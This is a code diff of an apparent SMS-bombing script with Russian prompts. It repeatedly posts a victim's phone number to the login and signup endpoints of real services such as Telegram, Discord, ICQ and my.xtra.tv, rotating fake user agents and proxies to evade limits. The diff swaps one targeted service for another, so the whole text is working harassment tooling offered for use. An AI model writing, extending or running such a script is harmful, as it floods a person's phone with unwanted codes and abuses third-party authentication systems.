@@ -48,11 +48,6 @@ run = int(console.input('[green]Введите количество повтор
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
- try:
-         requests.post("https://oll.tv/api/v3/auth/login?lang=rus", json={"login": number}, headers=headers, proxies=proxies)
-         print('66666666666')
- except:
-         print('Не отправлено (888888888888888)')
  try:#ok
          requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
          print('my.xtra.tv')
@@ -73,6 +68,11 @@ for _ in track(range(run)):
          print('telegram')
  except:
          print('Не отправлено (telegram)')
+ try:
+         requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers, proxies=proxies)
+         print('icq')
+ except:
+        print('Не отправлено (icq)')
  try:#ok/no
          requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
          print('discord')
